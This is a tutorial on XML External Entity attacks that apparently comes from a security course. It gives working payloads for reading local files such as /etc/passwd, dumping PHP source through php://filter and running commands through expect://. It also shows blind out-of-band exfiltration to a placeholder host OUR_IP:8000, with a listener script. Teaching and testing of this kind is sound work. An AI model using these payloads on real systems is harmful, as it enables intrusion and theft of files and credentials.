## Overview

XXE happens when an application parses **user-controlled XML** and allows external entities to be resolved.

If the XML parser is insecurely configured, we may be able to:

- define custom entities
- reference local files
- disclose source code
- trigger SSRF
- perform blind out-of-band exfiltration
- in rare cases, reach code execution

Think of XML entities like labels a parser will replace for you.  
If the parser trusts you too much, you can make those labels point at things the server should never show you.

---

# 1. What Makes XXE Possible

A typical vulnerable flow looks like this:

1. the application accepts XML input
2. the XML parser processes user-supplied entities
3. external entity resolution is enabled
4. no filtering or secure parser configuration is in place

This allows an attacker to define an entity that points to:

- a local file
- a remote URL
- another internal service
- a crafted external DTD

---

# 2. First Step – Identify XML Input

The first job is to find places where the application accepts XML.

Common targets:

- contact forms
- file uploads
- SOAP endpoints
- mobile API endpoints
- integrations and webhooks

Example target:

```text
http://SERVER_IP:PORT/index.php
```

A contact form submission is intercepted in Burp and the request body is XML.

That immediately makes it a strong XXE candidate.

---

# 3. Look for Reflection

If the application reflects part of the XML response back to us, exploitation becomes much easier.

In the example, the value inside:

```xml
<email></email>
```

is displayed in the HTTP response.

This is important because it tells us:

- which element is reflected
- where to inject entity references
- how to get file contents printed back to us

---

# 4. Test XML Entity Injection

Before going for file reads, first confirm whether entities are actually processed.

Add a DTD and define a harmless internal entity:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Then replace the email value with:

```xml
&company;
```

If the response shows:

```text
Inlane Freight
```

instead of:

```text
&company;
```

then the parser is resolving entities and the target is vulnerable to XXE.

A secure parser would treat it as plain text.

---

# 5. Basic Local File Read

Once entity resolution is confirmed, move to an external entity pointing to a local file.

Example:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Then use it in the reflected field:

```xml
<email>&company;</email>
```

If vulnerable, the application returns the file contents.

This is the classic XXE local file disclosure.

Common high-value targets include:

- `/etc/passwd`
- application configs
- environment files
- SSH keys
- web server configs

---

# 6. Why Source Code Reads Sometimes Fail

Trying to read something like:

```text
index.php
```

may fail even when `/etc/passwd` works.

Why:

- source files may contain characters like `<`, `>`, `&`
- binary or structured content may break XML parsing
- the parser may reject non-XML-safe content

So plain `file://` works well for text files, but not always for source code.

---

# 7. Reading PHP Source with `php://filter`

For PHP applications, a common workaround is base64-encoding the file before the parser reads it.

Example:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Then reference:

```xml
<email>&company;</email>
```

The response will contain base64 data.

Decode it to recover the source.

This is one of the most useful XXE tricks for PHP applications.

---

# 8. Why This Is Valuable

Reading source code can reveal:

- database credentials
- API keys
- internal routes
- hidden admin functions
- access control flaws
- file paths
- other vulnerabilities

At that point, XXE becomes a stepping stone to broader compromise.

---

# 9. XXE to RCE – Rare but Powerful

XXE is most commonly used for:

- file disclosure
- SSRF
- source code access

In some PHP environments, it may also be possible to reach code execution through:

```text
expect://
```

This depends on:

- PHP being used
- the `expect` module being installed and enabled
- XML syntax not being broken by the command

Example concept:

```xml
<!ENTITY company SYSTEM "expect://id">
```

If the application prints the entity output, command output may be shown.

This is not common on modern servers, so file read and source disclosure are usually the more realistic goals.

---

# 10. XXE for SSRF

Because external entities can reference URLs, XXE can often be repurposed for SSRF.

Examples:

- access internal web apps
- probe localhost services
- query metadata endpoints
- hit internal-only admin panels

XXE and SSRF often overlap heavily.

---

# 11. XXE DoS

A classic XML DoS is the “entity expansion” style payload, where entities recursively expand until memory is exhausted.

Example pattern:

- define `a0`
- reference it many times in `a1`
- reference `a1` many times in `a2`
- continue until parser or server chokes

This is largely mitigated in modern parsers and web servers, but it is still worth recognising as a historical XXE technique.

---

# 12. Blind XXE

Sometimes the application:

- accepts XML
- processes entities
- returns no reflected data
- shows no obvious output

That is **blind XXE**.

In blind cases, normal reflected file reads do not work.

Two main approaches then become useful:

- error-based XXE
- out-of-band (OOB) exfiltration

---

# 13. Error-Based XXE

If the application does not reflect entity output but **does** display parser/runtime errors, we may be able to force file content into an error message.

## Confirm error visibility

Trigger malformed XML or reference a missing entity.

If the server displays errors, that is exploitable.

## External DTD trick

Host a DTD that defines:

- a file entity
- an invalid entity reference that includes that file

Conceptually:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Then reference the remote DTD and `%error;`.

The parser throws an error, and the file content may appear as part of the error text.

This can work well when:

- reflection is absent
- error reporting is enabled
- parser exceptions leak content

It is less reliable than standard reflected XXE and may break on length or special-character issues.

---

# 14. Completely Blind XXE – OOB Exfiltration

In the hardest case, the application gives:

- no reflection
- no errors
- no visible effect

Then we switch to **out-of-band exfiltration**.

The idea:

- make the target parser fetch an attacker-controlled DTD
- have that DTD define an entity that sends the target file contents back to us in a request

This is the XXE equivalent of causing the server to “phone home” with the data.

---

# 15. OOB Exfiltration Strategy

## Step 1 – Base64 the file content

Use a parameter entity for the target file:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Step 2 – Force a request to our server containing the data

Define another parameter entity that builds a callback URL with the encoded file content:

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

## Step 3 – Trigger it from the victim

Main payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

When the parser resolves `&content;`, it makes a request to our server containing the base64 file content.

---

# 16. Capturing OOB Data

A simple server-side script can decode the `content` parameter and print it.

Conceptually:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

With a local server running, the attacker sees:

- DTD fetch from victim
- callback request
- decoded file content

This is the most reliable route when XXE is completely blind.

---

# 17. Automating Blind XXE

Manual OOB exfiltration works well, but tools can speed things up.

A commonly used example is:

```text
XXEinjector
```

It can automate:

- basic XXE
- error-based XXE
- blind HTTP OOB XXE
- PHP filter based extraction
- CDATA-based extraction

Typical workflow:

1. save the captured HTTP request to a file
2. insert a marker like:
   ```text
   XXEINJECT
   ```
3. run the tool pointing to:
   - your host
   - your HTTP listener
   - the file you want to read

This is useful in labs and when repeatedly testing multiple files.

---

# 18. CDATA for Arbitrary File Content

A recurring problem with XXE is that some file contents break XML parsing.

For example:

- source files
- HTML
- binary-ish data
- files containing XML special characters

CDATA can help because it tells the parser:

> treat this as raw text

The goal is to wrap file contents inside:

```xml
<![CDATA[ ... ]]>
```

---

# 19. Why Simple CDATA Joining Fails

A naive attempt might look like:

```xml
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```

This often fails because XML does not allow joining internal and external entities in that way.

---

# 20. CDATA via External Parameter Entities

The workaround is to use **parameter entities** in an external DTD.

Example external DTD content:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Main payload concept:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

This allows arbitrary file content to be wrapped safely and printed, even when plain file reads fail.

This is especially useful outside PHP environments where `php://filter` is not available.

---

# 21. Typical XXE Workflow

## Step 1 – identify XML input
Look for:

- XML request bodies
- SOAP
- file uploads involving XML
- alternate content types

## Step 2 – confirm entity resolution
Test with a harmless internal entity.

## Step 3 – identify reflected fields
Find which XML elements show up in the response.

## Step 4 – attempt local file reads
Start with text files like `/etc/passwd`.

## Step 5 – escalate to source disclosure
Use:
- `php://filter`
- CDATA techniques
- error-based methods

## Step 6 – if blind, use OOB exfiltration
Host:
- DTD
- HTTP listener
- decoding helper

---

# 22. Key Things to Watch For

- XML input accepted directly
- parser reflects entity output
- application leaks parser/runtime errors
- alternate content types accepted even when app normally uses JSON
- backend language/framework hints that affect which XXE tricks will work

A JSON API may still be vulnerable if it also accepts:

```http
Content-Type: application/xml
```

Always test alternate content types when the backend might support them.

---

# 23. Key Takeaways

- XXE starts with finding XML input and confirming entity resolution
- reflected fields make exploitation much easier
- local file disclosure is the most common XXE impact
- PHP source reads often require `php://filter` base64 encoding
- blind XXE can still be exploited through error-based leakage or OOB exfiltration
- CDATA-based methods help with reading files that break normal XML parsing
- XXE often leads to broader attacks such as:
  - source disclosure
  - SSRF
  - internal enumeration
  - occasionally code execution
